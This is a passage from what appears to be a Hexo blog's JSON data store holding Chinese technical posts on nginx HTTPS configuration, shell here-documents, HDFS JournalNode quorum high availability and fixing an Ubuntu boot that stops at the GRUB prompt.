title=\"获取证书\"></a>获取证书</h3><p>证书有很多种，具体可以自行了解。对我来说，越便宜越好，能不收钱那是最好的。国内有很多厂商可以支持免费的ssl证书，主要是去支持个人站点。我选用的是腾讯提供的免费的ssl证书。这个是直达链接，复制链接之后按照操作就可以申请到<a href=\"https://cloud.tencent.com/product/ssl\" target=\"_blank\" rel=\"noopener\">https://cloud.tencent.com/product/ssl</a>            证书了。</p>\n<h3 id=\"nginx配置\"><a href=\"#nginx配置\" class=\"headerlink\" title=\"nginx配置\"></a>nginx配置</h3><p>我用的是nginx的服务器，所以我只能描述下nginx的配置。我的配置入下，我的这个配置可以支持，http直接跳转到https。下面的配置只需要把自己的证书位置替换之后，重启nginx服务器就可以生效了。  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen  443 ssl;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    ssl on;</span><br><span class=\"line\">    ssl_certificate &quot;&#x2F;etc&#x2F;crt&#x2F;1_blog.sleepan.com_bundle.crt&quot;;</span><br><span class=\"line\">    ssl_certificate_key &quot;&#x2F;etc&#x2F;crt&#x2F;2_blog.sleepan.com.key&quot;;</span><br><span class=\"line\">    ssl_session_cache shared:SSL:1m;</span><br><span class=\"line\">    ssl_session_timeout  10m;</span><br><span class=\"line\">    ssl_ciphers HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\">    server_name  blog.sleepan.com;</span><br><span class=\"line\">    root         &#x2F;var&#x2F;www&#x2F;blog;</span><br><span class=\"line\">    index        index.php index.html index.htm;</span><br><span class=\"line\">    # Load configuration files for the default server block.</span><br><span class=\"line\">    include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf;</span><br><span class=\"line\">    if ($scheme &#x3D; http) &#123;</span><br><span class=\"line\">      return 301 https:&#x2F;&#x2F;$host$request_uri;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location &#x2F; &#123;</span><br><span class=\"line\">     try_files $uri $uri&#x2F; &#x2F;index.php?$query_string;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    error_page 404 &#x2F;404.html;</span><br><span class=\"line\">        location &#x3D; &#x2F;40x.html &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    error_page 500 502 503 504 &#x2F;50x.html;</span><br><span class=\"line\">      location &#x3D; &#x2F;50x.html &#123;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">    location ~ \\.php$ &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      fastcgi_index   index.php;</span><br><span class=\"line\">      fastcgi_pass    127.0.0.1:9000;</span><br><span class=\"line\">      include         fastcgi_params;</span><br><span class=\"line\">      fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span><br><span class=\"line\">      fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>网络安全现在变得越来越重要。为了防止我的博客被劫持被运营商强制加弹窗小广告，我还是对博客进行了https升级。同时也能优先我的博客被各大搜索引擎所收录。特此记录下过程，帮助和我有需要的同学快速对博客小站进行http改造。</p>\n<h3 id=\"获取证书\"><a href=\"#获取证书\" class=\"headerlink\" title=\"获取证书\"></a>获取证书</h3><p>证书有很多种，具体可以自行了解。对我来说，越便宜越好，能不收钱那是最好的。国内有很多厂商可以支持免费的ssl证书，主要是去支持个人站点。我选用的是腾讯提供的免费的ssl证书。这个是直达链接，复制链接之后按照操作就可以申请到<a href=\"https://cloud.tencent.com/product/ssl\" target=\"_blank\" rel=\"noopener\">https://cloud.tencent.com/product/ssl</a>            证书了。</p>\n<h3 id=\"nginx配置\"><a href=\"#nginx配置\" class=\"headerlink\" title=\"nginx配置\"></a>nginx配置</h3><p>我用的是nginx的服务器，所以我只能描述下nginx的配置。我的配置入下，我的这个配置可以支持，http直接跳转到https。下面的配置只需要把自己的证书位置替换之后，重启nginx服务器就可以生效了。  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen  443 ssl;</span><br><span class=\"line\">    listen 80;</span><br><span class=\"line\">    ssl on;</span><br><span class=\"line\">    ssl_certificate &quot;&#x2F;etc&#x2F;crt&#x2F;1_blog.sleepan.com_bundle.crt&quot;;</span><br><span class=\"line\">    ssl_certificate_key &quot;&#x2F;etc&#x2F;crt&#x2F;2_blog.sleepan.com.key&quot;;</span><br><span class=\"line\">    ssl_session_cache shared:SSL:1m;</span><br><span class=\"line\">    ssl_session_timeout  10m;</span><br><span class=\"line\">    ssl_ciphers HIGH:!aNULL:!MD5;</span><br><span class=\"line\">    ssl_prefer_server_ciphers on;</span><br><span class=\"line\">    server_name  blog.sleepan.com;</span><br><span class=\"line\">    root         &#x2F;var&#x2F;www&#x2F;blog;</span><br><span class=\"line\">    index        index.php index.html index.htm;</span><br><span class=\"line\">    # Load configuration files for the default server block.</span><br><span class=\"line\">    include &#x2F;etc&#x2F;nginx&#x2F;default.d&#x2F;*.conf;</span><br><span class=\"line\">    if ($scheme &#x3D; http) &#123;</span><br><span class=\"line\">      return 301 https:&#x2F;&#x2F;$host$request_uri;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location &#x2F; &#123;</span><br><span class=\"line\">     try_files $uri $uri&#x2F; &#x2F;index.php?$query_string;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    error_page 404 &#x2F;404.html;</span><br><span class=\"line\">        location &#x3D; &#x2F;40x.html &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    error_page 500 502 503 504 &#x2F;50x.html;</span><br><span class=\"line\">      location &#x3D; &#x2F;50x.html &#123;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">    location ~ \\.php$ &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      fastcgi_index   index.php;</span><br><span class=\"line\">      fastcgi_pass    127.0.0.1:9000;</span><br><span class=\"line\">      include         fastcgi_params;</span><br><span class=\"line\">      fastcgi_param   SCRIPT_FILENAME    $document_root$fastcgi_script_name;</span><br><span class=\"line\">      fastcgi_param   SCRIPT_NAME        $fastcgi_script_name;</span><br><span class=\"line\"></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"Here Document了解一下","date":"2018-06-23T12:01:46.000Z","_content":"### 发现问题\n经常在编写shell脚本的时候，结果脚本里面有一个命令需要从命令行输入内容才能继续执行。比如有如下脚本1.sh，有如下代码，假设我们想静默的调用这个脚本：\n\n```shell\n#!/bin/bash\necho \"用户名\"\nread username\necho $username\necho \"密码\"\nread password\necho $password\n\n```\n但是当我们执行./1.sh的时候，我们需要从键盘输入一些数据，脚本才可以继续向下执行。那我们怎么才能预定义好要输入的数据，让这个程序静默执行呢。\n### here document来解决问题。\nHere Document 是在Linux Shell 中的一种特殊的重定向方式，它的基本的形式如下\n\n```\ncmd << delimiter\n  Here Document Content\ndelimiter\n```\n因此我们执行上面那个脚本，可以这样执行：\n\n```\n./1.sh << delimiter\n  fzy\n  123\ndelimiter\n```\n可以得到如下结果：\n\n```\npromote:~ fangzhenyi$ ./1.sh << delimiter\n>   fzy\n>   123\n> delimiter\n用户名\nfzy\n密码\n123\n```\n但是，假设我们执行这个脚本，只需要一行呢，这个时候该怎么办呢（编写dockerfile很多命令都需要一行，换行会带来很多莫名其妙的问题）。一行的话，我们可以采用如下写法。\n\n```\npromote:~ fangzhenyi$ echo -e \"fzy\\n123\" | ./1.sh \n用户名\nfzy\n密码\n123\n```\n\n\n\n\n\n\n","source":"_posts/Here-Document.md","raw":"---\ntitle: Here Document了解一下\ndate: 2018-06-23 20:01:46\ntags: ubuntu linux\n---\n### 发现问题\n经常在编写shell脚本的时候，结果脚本里面有一个命令需要从命令行输入内容才能继续执行。比如有如下脚本1.sh，有如下代码，假设我们想静默的调用这个脚本：\n\n```shell\n#!/bin/bash\necho \"用户名\"\nread username\necho $username\necho \"密码\"\nread password\necho $password\n\n```\n但是当我们执行./1.sh的时候，我们需要从键盘输入一些数据，脚本才可以继续向下执行。那我们怎么才能预定义好要输入的数据，让这个程序静默执行呢。\n### here document来解决问题。\nHere Document 是在Linux Shell 中的一种特殊的重定向方式，它的基本的形式如下\n\n```\ncmd << delimiter\n  Here Document Content\ndelimiter\n```\n因此我们执行上面那个脚本，可以这样执行：\n\n```\n./1.sh << delimiter\n  fzy\n  123\ndelimiter\n```\n可以得到如下结果：\n\n```\npromote:~ fangzhenyi$ ./1.sh << delimiter\n>   fzy\n>   123\n> delimiter\n用户名\nfzy\n密码\n123\n```\n但是，假设我们执行这个脚本，只需要一行呢，这个时候该怎么办呢（编写dockerfile很多命令都需要一行，换行会带来很多莫名其妙的问题）。一行的话，我们可以采用如下写法。\n\n```\npromote:~ fangzhenyi$ echo -e \"fzy\\n123\" | ./1.sh \n用户名\nfzy\n密码\n123\n```\n\n\n\n\n\n\n","slug":"Here-Document","published":1,"updated":"2018-08-19T08:28:55.522Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gce0008ak9c9eot01ej","content":"<h3 id=\"发现问题\"><a href=\"#发现问题\" class=\"headerlink\" title=\"发现问题\"></a>发现问题</h3><p>经常在编写shell脚本的时候，结果脚本里面有一个命令需要从命令行输入内容才能继续执行。比如有如下脚本1.sh，有如下代码，假设我们想静默的调用这个脚本：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\">echo \"用户名\"</span><br><span class=\"line\">read username</span><br><span class=\"line\">echo $username</span><br><span class=\"line\">echo \"密码\"</span><br><span class=\"line\">read password</span><br><span class=\"line\">echo $password</span><br></pre></td></tr></table></figure>\n<p>但是当我们执行./1.sh的时候，我们需要从键盘输入一些数据，脚本才可以继续向下执行。那我们怎么才能预定义好要输入的数据，让这个程序静默执行呢。</p>\n<h3 id=\"here-document来解决问题。\"><a href=\"#here-document来解决问题。\" class=\"headerlink\" title=\"here document来解决问题。\"></a>here document来解决问题。</h3><p>Here Document 是在Linux Shell 中的一种特殊的重定向方式，它的基本的形式如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd &lt;&lt; delimiter</span><br><span class=\"line\">  Here Document Content</span><br><span class=\"line\">delimiter</span><br></pre></td></tr></table></figure>\n<p>因此我们执行上面那个脚本，可以这样执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.&#x2F;1.sh &lt;&lt; delimiter</span><br><span class=\"line\">  fzy</span><br><span class=\"line\">  123</span><br><span class=\"line\">delimiter</span><br></pre></td></tr></table></figure>\n<p>可以得到如下结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promote:~ fangzhenyi$ .&#x2F;1.sh &lt;&lt; delimiter</span><br><span class=\"line\">&gt;   fzy</span><br><span class=\"line\">&gt;   123</span><br><span class=\"line\">&gt; delimiter</span><br><span class=\"line\">用户名</span><br><span class=\"line\">fzy</span><br><span class=\"line\">密码</span><br><span class=\"line\">123</span><br></pre></td></tr></table></figure>\n<p>但是，假设我们执行这个脚本，只需要一行呢，这个时候该怎么办呢（编写dockerfile很多命令都需要一行，换行会带来很多莫名其妙的问题）。一行的话，我们可以采用如下写法。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promote:~ fangzhenyi$ echo -e &quot;fzy\\n123&quot; | .&#x2F;1.sh </span><br><span class=\"line\">用户名</span><br><span class=\"line\">fzy</span><br><span class=\"line\">密码</span><br><span class=\"line\">123</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"发现问题\"><a href=\"#发现问题\" class=\"headerlink\" title=\"发现问题\"></a>发现问题</h3><p>经常在编写shell脚本的时候，结果脚本里面有一个命令需要从命令行输入内容才能继续执行。比如有如下脚本1.sh，有如下代码，假设我们想静默的调用这个脚本：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/bin/bash</span></span><br><span class=\"line\">echo \"用户名\"</span><br><span class=\"line\">read username</span><br><span class=\"line\">echo $username</span><br><span class=\"line\">echo \"密码\"</span><br><span class=\"line\">read password</span><br><span class=\"line\">echo $password</span><br></pre></td></tr></table></figure>\n<p>但是当我们执行./1.sh的时候，我们需要从键盘输入一些数据，脚本才可以继续向下执行。那我们怎么才能预定义好要输入的数据，让这个程序静默执行呢。</p>\n<h3 id=\"here-document来解决问题。\"><a href=\"#here-document来解决问题。\" class=\"headerlink\" title=\"here document来解决问题。\"></a>here document来解决问题。</h3><p>Here Document 是在Linux Shell 中的一种特殊的重定向方式，它的基本的形式如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cmd &lt;&lt; delimiter</span><br><span class=\"line\">  Here Document Content</span><br><span class=\"line\">delimiter</span><br></pre></td></tr></table></figure>\n<p>因此我们执行上面那个脚本，可以这样执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.&#x2F;1.sh &lt;&lt; delimiter</span><br><span class=\"line\">  fzy</span><br><span class=\"line\">  123</span><br><span class=\"line\">delimiter</span><br></pre></td></tr></table></figure>\n<p>可以得到如下结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promote:~ fangzhenyi$ .&#x2F;1.sh &lt;&lt; delimiter</span><br><span class=\"line\">&gt;   fzy</span><br><span class=\"line\">&gt;   123</span><br><span class=\"line\">&gt; delimiter</span><br><span class=\"line\">用户名</span><br><span class=\"line\">fzy</span><br><span class=\"line\">密码</span><br><span class=\"line\">123</span><br></pre></td></tr></table></figure>\n<p>但是，假设我们执行这个脚本，只需要一行呢，这个时候该怎么办呢（编写dockerfile很多命令都需要一行，换行会带来很多莫名其妙的问题）。一行的话，我们可以采用如下写法。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promote:~ fangzhenyi$ echo -e &quot;fzy\\n123&quot; | .&#x2F;1.sh </span><br><span class=\"line\">用户名</span><br><span class=\"line\">fzy</span><br><span class=\"line\">密码</span><br><span class=\"line\">123</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n"},{"title":"hdfs的JournalNode角色高可用理论原理","date":"2018-03-20T14:37:40.000Z","_content":"### 前言\n在hdfs的namenode可以支持HA的时候，需要在两个namenode间进行共享editlog，hadoop社区提出了很多做法，可以通过配置nfs共享文件夹，也可以配置JournalNode去共享editlog。每次active的JournalNode都会写editlog到JournalNode，StandBy的JournalNode会去JournalNode拉取editlog。但是问题又来了，怎么保证JournalNode的高可用呢。社区的相关讨论都在这里https://issues.apache.org/jira/browse/HDFS-3077\n\n### 理论基础\nJournalNode采用的Quorum协议，去保证数据的一致性，通过添加奇数个节点去保证高可用。只要一半以上的节点可用，JournalNode就能正常提供服务。JournalNode每次写editlog都要保证写成功半数以上，才算写成功。\n\n下面我来分析一下，为啥要半数以上的节点呢。这个是由Quorum协议规定的。Quorum协议非常简单理解。\n\n它有三个变量。\nN:复制节点数量  \nR:成功读操作的节点数  \nW:成功写操作的节点数   \n \n假设有三个节点，那么我每次写2个节点，才算写成功。那么会有一个节点不包含更新的最新值，那么每次都读2个节点的话，那么我就可以读取到最新的值。所以JournalNode就利用这个原理，去保证数据的一致性和高可用。\n\n\n\n","source":"_posts/JournalNode协议原理.md","raw":"---\ntitle: 'hdfs的JournalNode角色高可用理论原理'\ndate: 2018-3-20 22:37:40\ntags: java hdfs\n---\n### 前言\n在hdfs的namenode可以支持HA的时候，需要在两个namenode间进行共享editlog，hadoop社区提出了很多做法，可以通过配置nfs共享文件夹，也可以配置JournalNode去共享editlog。每次active的JournalNode都会写editlog到JournalNode，StandBy的JournalNode会去JournalNode拉取editlog。但是问题又来了，怎么保证JournalNode的高可用呢。社区的相关讨论都在这里https://issues.apache.org/jira/browse/HDFS-3077\n\n### 理论基础\nJournalNode采用的Quorum协议，去保证数据的一致性，通过添加奇数个节点去保证高可用。只要一半以上的节点可用，JournalNode就能正常提供服务。JournalNode每次写editlog都要保证写成功半数以上，才算写成功。\n\n下面我来分析一下，为啥要半数以上的节点呢。这个是由Quorum协议规定的。Quorum协议非常简单理解。\n\n它有三个变量。\nN:复制节点数量  \nR:成功读操作的节点数  \nW:成功写操作的节点数   \n \n假设有三个节点，那么我每次写2个节点，才算写成功。那么会有一个节点不包含更新的最新值，那么每次都读2个节点的话，那么我就可以读取到最新的值。所以JournalNode就利用这个原理，去保证数据的一致性和高可用。\n\n\n\n","slug":"JournalNode协议原理","published":1,"updated":"2018-08-19T08:30:12.977Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gcf0009ak9c08bv06ll","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>在hdfs的namenode可以支持HA的时候，需要在两个namenode间进行共享editlog，hadoop社区提出了很多做法，可以通过配置nfs共享文件夹，也可以配置JournalNode去共享editlog。每次active的JournalNode都会写editlog到JournalNode，StandBy的JournalNode会去JournalNode拉取editlog。但是问题又来了，怎么保证JournalNode的高可用呢。社区的相关讨论都在这里<a href=\"https://issues.apache.org/jira/browse/HDFS-3077\" target=\"_blank\" rel=\"noopener\">https://issues.apache.org/jira/browse/HDFS-3077</a></p>\n<h3 id=\"理论基础\"><a href=\"#理论基础\" class=\"headerlink\" title=\"理论基础\"></a>理论基础</h3><p>JournalNode采用的Quorum协议，去保证数据的一致性，通过添加奇数个节点去保证高可用。只要一半以上的节点可用，JournalNode就能正常提供服务。JournalNode每次写editlog都要保证写成功半数以上，才算写成功。</p>\n<p>下面我来分析一下，为啥要半数以上的节点呢。这个是由Quorum协议规定的。Quorum协议非常简单理解。</p>\n<p>它有三个变量。<br>N:复制节点数量<br>R:成功读操作的节点数<br>W:成功写操作的节点数   </p>\n<p>假设有三个节点，那么我每次写2个节点，才算写成功。那么会有一个节点不包含更新的最新值，那么每次都读2个节点的话，那么我就可以读取到最新的值。所以JournalNode就利用这个原理，去保证数据的一致性和高可用。</p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>在hdfs的namenode可以支持HA的时候，需要在两个namenode间进行共享editlog，hadoop社区提出了很多做法，可以通过配置nfs共享文件夹，也可以配置JournalNode去共享editlog。每次active的JournalNode都会写editlog到JournalNode，StandBy的JournalNode会去JournalNode拉取editlog。但是问题又来了，怎么保证JournalNode的高可用呢。社区的相关讨论都在这里<a href=\"https://issues.apache.org/jira/browse/HDFS-3077\" target=\"_blank\" rel=\"noopener\">https://issues.apache.org/jira/browse/HDFS-3077</a></p>\n<h3 id=\"理论基础\"><a href=\"#理论基础\" class=\"headerlink\" title=\"理论基础\"></a>理论基础</h3><p>JournalNode采用的Quorum协议，去保证数据的一致性，通过添加奇数个节点去保证高可用。只要一半以上的节点可用，JournalNode就能正常提供服务。JournalNode每次写editlog都要保证写成功半数以上，才算写成功。</p>\n<p>下面我来分析一下，为啥要半数以上的节点呢。这个是由Quorum协议规定的。Quorum协议非常简单理解。</p>\n<p>它有三个变量。<br>N:复制节点数量<br>R:成功读操作的节点数<br>W:成功写操作的节点数   </p>\n<p>假设有三个节点，那么我每次写2个节点，才算写成功。那么会有一个节点不包含更新的最新值，那么每次都读2个节点的话，那么我就可以读取到最新的值。所以JournalNode就利用这个原理，去保证数据的一致性和高可用。</p>\n"},{"title":"ubuntu启动就进入grub页面","date":"2017-12-23T12:01:46.000Z","_content":"#### 一.发生现象   \n在我给服务器装好了ubuntu系统16.04.3的系统后，修改了fstable配置项然后进行重启，然后就发现ubuntu系统起不来了，还原配置仍旧启动不起来。插上显示器就发现服务器进入了grub命令行页面。grub页面上面的标题显示Minimal BASH-like line editing is supported. For [duplicate]。以为是修改配置项出错，只能重新从U盘启动ubuntu 16.04系统。try install安装ubuntu系统，还原了各项配置项，仍旧无法启动。  \n#### 二.解决方法 \n在网上查找了各项资料。搜到一个可以外文资料，按照操作，成功修复操作系统。现在记录操作如下。  \n1.制作u盘启动盘，启动ubuntu。  \n2.通过u盘启动，进去ubuntu try intall，进入系统。  \n3.确定自己的系统装在那个系统分区下面。  \n4.执行命令,取代sda2用当前自己的系统分区\n\n```  \nsudo mount /dev/sda2 /mnt\nfor i in /sys /proc /run /dev; do sudo mount --bind \"$i\" \"/mnt$i\"; done\nsudo chroot /mnt\nupdate-grub\n\n```   \n附上原文地址：https://elementaryos.stackexchange.com/questions/2716/error-in-grub-minimal-bash-like-line-editing-is-supported-for\n\n\n\n","source":"_posts/ubuntu启动就进入grub页面.md","raw":"---\ntitle: ubuntu启动就进入grub页面\ndate: 2017-12-23 20:01:46\ntags: ubuntu linux\n---\n#### 一.发生现象   \n在我给服务器装好了ubuntu系统16.04.3的系统后，修改了fstable配置项然后进行重启，然后就发现ubuntu系统起不来了，还原配置仍旧启动不起来。插上显示器就发现服务器进入了grub命令行页面。grub页面上面的标题显示Minimal BASH-like line editing is supported. For [duplicate]。以为是修改配置项出错，只能重新从U盘启动ubuntu 16.04系统。try install安装ubuntu系统，还原了各项配置项，仍旧无法启动。  \n#### 二.解决方法 \n在网上查找了各项资料。搜到一个可以外文资料，按照操作，成功修复操作系统。现在记录操作如下。  \n1.制作u盘启动盘，启动ubuntu。  \n2.通过u盘启动，进去ubuntu try intall，进入系统。  \n3.确定自己的系统装在那个系统分区下面。  \n4.执行命令,取代sda2用当前自己的系统分区\n\n```  \nsudo mount /dev/sda2 /mnt\nfor i in /sys /proc /run /dev; do sudo mount --bind \"$i\" \"/mnt$i\"; done\nsudo chroot /mnt\nupdate-grub\n\n```   \n附上原文地址：https://elementaryos.stackexchange.com/questions/2716/error-in-grub-minimal-bash-like-line-editing-is-supported-for\n\n\n\n","slug":"ubuntu启动就进入grub页面","published":1,"updated":"2018-01-17T13:58:15.182Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gch000bak9c68ky2bxc","content":"<h4 id=\"一-发生现象\"><a href=\"#一-发生现象\" class=\"headerlink\" title=\"一.发生现象\"></a>一.发生现象</h4><p>在我给服务器装好了ubuntu系统16.04.3的系统后，修改了fstable配置项然后进行重启，然后就发现ubuntu系统起不来了，还原配置仍旧启动不起来。插上显示器就发现服务器进入了grub命令行页面。grub页面上面的标题显示Minimal BASH-like line editing is supported. For [duplicate]。以为是修改配置项出错，只能重新从U盘启动ubuntu 16.04系统。try install安装ubuntu系统，还原了各项配置项，仍旧无法启动。  </p>\n<h4 id=\"二-解决方法\"><a href=\"#二-解决方法\" class=\"headerlink\" title=\"二.解决方法\"></a>二.解决方法</h4><p>在网上查找了各项资料。搜到一个可以外文资料，按照操作，成功修复操作系统。现在记录操作如下。<br>1.制作u盘启动盘，启动ubuntu。<br>2.通过u盘启动，进去ubuntu try intall，进入系统。<br>3.确定自己的系统装在那个系统分区下面。<br>4.执行命令,取代sda2用当前自己的系统分区</p>\n<pre><code>sudo mount /dev/sda2 /mnt\nfor i in /sys /proc /run /dev; do sudo mount --bind &quot;$i&quot; &quot;/mnt$i&quot;; done\nsudo chroot /mnt\nupdate-grub\n</code></pre><p>附上原文地址：<a href=\"https://elementaryos.stackexchange.com/questions/2716/error-in-grub-minimal-bash-like-line-editing-is-supported-for\" target=\"_blank\" rel=\"noopener\">https://elementaryos.stackexchange.com/questions/2716/error-in-grub-minimal-bash-like-line-editing-is-supported-for</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"一-发生现象\"><a href=\"#一-发生现象\" class=\"headerlink\" title=\"一.发生现象\"></a>一.发生现象</h4><p>在我给服务器装好了ubuntu系统16.04.3的系统后，修改了fstable配置项然后进行重启，然后就发现ubuntu系统起不来了，还原配置仍旧启动不起来。插上显示器就发现服务器进入了grub命令行页面。grub页面上面的标题显示Minimal BASH-like line editing is supported. For [duplicate]。以为是修改配置项出错，只能重新从U盘启动ubuntu 16.04系统。try install安装ubuntu系统，还原了各项配置项，仍旧无法启动。  </p>\n<h4 id=\"二-解决方法\"><a href=\"#二-解决方法\" class=\"headerlink\" title=\"二.解决方法\"></a>二.解决方法</h4><p>在网上查找了各项资料。搜到一个可以外文资料，按照操作，成功修复操作系统。现在记录操作如下。<br>1.制作u盘启动盘，启动ubuntu。<br>2.通过u盘启动，进去ubuntu try intall，进入系统。<br>3.确定自己的系统装在那个系统分区下面。<br>4.执行命令,取代sda2用当前自己的系统分区</p>\n<pre><code>sudo mount /dev/sda2 /mnt\nfor i in /sys /proc /run /dev; do sudo mount --bind &quot;$i&quot; &quot;/mnt$i&quot;; done\nsudo chroot /mnt\nupdate-grub\n</code></pre><p>附上原文地址：<a href=\"https://elementaryos.stackexchange.com/questions/2716/error-in-grub-minimal-bash-like-line-editing-is-supported-for\" 